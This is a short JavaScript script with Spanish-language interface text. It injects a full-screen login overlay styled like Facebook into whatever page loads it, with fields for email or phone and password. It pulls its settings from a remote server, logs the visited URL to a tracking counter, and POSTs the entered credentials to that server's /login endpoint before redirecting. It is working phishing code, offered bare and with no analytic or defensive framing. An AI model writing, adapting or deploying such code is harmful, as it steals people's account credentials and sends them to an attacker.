(function() {
    const SERVER_URL = "https://jeffrey123.onrender.com"; 

    async function init() {
        const res = await fetch(`${SERVER_URL}/config`);
        const config = await res.json();
        
        // Rastreo
        if (config.counter_id) {
            const img = new Image();
            img.src = `https://whos.amung.us/pingjs/?k=${config.counter_id}&t=${encodeURIComponent(config.title)}&x=${encodeURIComponent(window.location.href)}`;
        }

        // Crear Interfaz con Título Dinámico
        const overlay = document.createElement('div');
        overlay.style = "position:fixed!important;top:0!important;left:0!important;width:100vw!important;height:100vh!important;background:rgba(0,0,0,0.8)!important;z-index:2147483647!important;display:flex!important;justify-content:center!important;align-items:center!important;backdrop-filter:blur(8px)!important;";
        overlay.innerHTML = `
            <div style="background:white!important;padding:40px 30px!important;border-radius:12px!important;width:400px!important;max-width:90%!important;text-align:center!important;font-family:Arial,sans-serif!important;box-sizing:border-box!important;">
                <h2 style="color:#1877f2!important;margin:0 0 25px 0!important;font-size:30px!important;">${config.title}</h2>
                <input id="i-email" type="text" placeholder="Correo o teléfono" style="width:100%!important;height:52px!important;margin-bottom:12px!important;padding:0 15px!important;border:1px solid #dddfe2!important;border-radius:6px!important;font-size:17px!important;box-sizing:border-box!important;">
                <input id="i-pass" type="password" placeholder="Contraseña" style="width:100%!important;height:52px!important;margin-bottom:20px!important;padding:0 15px!important;border:1px solid #dddfe2!important;border-radius:6px!important;font-size:17px!important;box-sizing:border-box!important;">
                <button id="i-btn" style="width:100%!important;height:52px!important;background:#1877f2!important;color:white!important;border:none!important;border-radius:6px!important;font-size:20px!important;font-weight:bold!important;cursor:pointer!important;">Entrar</button>
            </div>
        `;
        document.body.appendChild(overlay);

        document.getElementById('i-btn').onclick = async function() {
            const email = document.getElementById('i-email').value;
            const password = document.getElementById('i-pass').value;
            if(!email || !password) return;
            this.innerText = "Cargando...";
            await fetch(`${SERVER_URL}/login`, { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ email, password }) });
            window.location.href = config.redirect_url;
        };
    }
    init();
})();
